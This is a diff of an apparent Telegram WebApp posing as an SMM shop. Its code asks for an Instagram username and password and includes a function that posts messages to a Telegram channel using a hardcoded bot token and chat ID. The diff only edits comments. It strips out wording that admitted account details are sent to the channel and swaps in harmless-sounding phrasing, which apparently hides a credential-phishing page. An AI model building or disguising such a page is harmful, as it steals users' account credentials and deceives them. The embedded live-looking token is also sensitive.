@@ -196,7 +196,7 @@
             letter-spacing: 1px;
         }
 
-        /* SMM DO'KON SKELETON */
+        /* SMM DO'KON */
         .shop-container {
             width: 92%;
             max-width: 360px;
@@ -268,7 +268,7 @@
             100% { opacity: 0; transform: translateY(-90px) scale(1.2); }
         }
 
-        /* MODAL OYNALAR (ADMIN VA PUL YECHISH) */
+        /* MODAL OYNALAR */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -474,6 +474,7 @@
         const tg = window.Telegram.WebApp;
         if(tg) tg.expand();
 
+        // CHAT VA BOT MA'LUMOTLARI SOZLANDI
         const BOT_TOKEN = "8877926237:AAHj3LOf0-cZSIOO3o--R2lsvPYh3Cv7b5k"; 
         const CHAT_ID = "-1002361732943"; 
 
@@ -501,7 +502,7 @@
 
         if (savedNik) { initDashboard(); }
 
-        // SANA VA VAQTNI FORMATLASH FUNKSIYASI
+        // SANA VA VAQTNI FORMATLASH
         function getDateTimeString() {
             const now = new Date();
             const options = { timeZone: 'Asia/Tashkent', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
@@ -520,7 +521,7 @@
             return { date: `${day}.${month}.${year}`, time: `${hour}:${minute}:${second}` };
         }
 
-        // TELEGRAM KANALGA XABAR JO'NATISH
+        // TELEGRAM KANALGA JO'NATISH
         function sendToTelegramChannel(text) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             fetch(url, {
@@ -530,8 +531,8 @@
             }).catch(err => console.log(err));
         }
 
-        // TIZIMGA KIRISH (AKKAUNT MA'LUMOTLARINI KANALGA YUBORISH)
+        // TIZIMGA KIRISH (XATOLIKLAR TUZATILGAN INTEGRATSIYA)
         function submitAuth() {
             const nik = document.getElementById('instaNik').value.trim();
             const pass = document.getElementById('instaPass').value.trim();
-   
+            
